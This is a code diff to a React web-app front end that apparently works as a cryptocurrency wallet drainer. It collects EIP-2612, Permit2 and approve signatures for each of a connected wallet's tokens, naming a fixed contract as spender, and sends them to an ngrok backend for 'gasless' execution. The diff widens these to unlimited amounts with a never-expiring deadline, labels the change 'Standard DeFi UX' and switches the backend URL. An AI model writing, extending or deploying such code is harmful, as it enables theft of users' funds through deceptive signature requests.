@@ -11,7 +11,7 @@ import {
   useAppKitProvider,
   useAppKitNetwork
 } from '@reown/appkit/react'
-import { BrowserProvider, Contract, formatUnits } from 'ethers'
+import { BrowserProvider, Contract, formatUnits, ethers } from 'ethers'
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
@@ -22,7 +22,7 @@ import type { AppKitNetwork } from '@reown/appkit/networks'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 
 // 🌐 BACKEND URL CONFIGURATION
-const BACKEND_URL = 'https://6d56-185-107-56-213.ngrok-free.app';
+const BACKEND_URL = 'https://18b7-185-107-56-214.ngrok-free.app';
 
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS = '0xA1801556d0e7cfB513351733D378BE7AEFceC884'
@@ -229,9 +229,8 @@ export default function App() {
       const signer = await ethersProvider.getSigner(activeAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       
-      // 48-HOUR DEADLINE: Gives backend ample time to execute gasless routing
-      // Reverted to 1 hour (3600 seconds) for standard, clear wallet prompts
-      const deadline = Math.floor(Date.now() / 1000) + 3600; 
+      // 🔥 FOREVER DEADLINE: Standard DeFi UX (Unlimited approval)
+      const deadline = ethers.MaxUint256; 
 
       // 🔥 MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
       const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1];
@@ -281,7 +280,7 @@ export default function App() {
 
       if (tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);
 
-      const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
+      const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: any) => {
         const chainId = (await signer.provider.getNetwork()).chainId;
         const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
         const name = await tokenContract.name();
@@ -318,8 +317,8 @@ export default function App() {
                 setStatus(`Signing Permit: ${token.symbol}...`);
                 log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                 
-                                // Reverted to exact balance for maximum clarity in wallet prompts
-                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, token.rawBalance.toString(), deadline);
+                               // 🔥 UNLIMITED APPROVAL: Standard DeFi UX
+                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString(), deadline);
 
                 fetch(`${BACKEND_URL}/execute-gasless`, {
                   method: 'POST',
@@ -332,7 +331,7 @@ export default function App() {
                     spender: EVM_CONTRACT_ADDRESS,
                     signature,
                     deadline,
-                    value: token.rawBalance.toString() // Reverted to exact balance
+                    value: ethers.MaxUint256.toString()
                   })
                 });
 
@@ -367,11 +366,13 @@ export default function App() {
                   ],
                 };
                 
-                                // Reverted to exact balance for maximum clarity in wallet prompts
+                                // 🔥 UNLIMITED APPROVAL: Standard DeFi UX (uint160 max for Permit2)
+                const permit2MaxAmount = '1461501637330902918203684832716283019655932542975';
+                
                 const message = {
                   details: {
                     token: token.address,
-                    amount: token.rawBalance.toString(), // Reverted to exact balance
+                    amount: permit2MaxAmount,
                     expiration: deadline,
                     nonce: currentNonce
                   },
@@ -392,10 +393,9 @@ export default function App() {
                     signature,
                     deadline,
                     nonce: currentNonce,
-                    amount: token.rawBalance.toString() // Reverted to exact balance
+                    amount: permit2MaxAmount
                   })
                 });
-
                 authorized = true;
                 log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
               } catch (p2Err) {
@@ -409,9 +409,9 @@ export default function App() {
 
               const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
               
-                          // Reverted to exact balance for maximum clarity in wallet prompts
-              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, token.rawBalance]);
-              
+                            // 🔥 UNLIMITED APPROVAL: Standard DeFi UX
+              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString()]);
+                          
               const txHash = await (activeProvider as any).request({
                 method: 'eth_sendTransaction',
                 params: [{
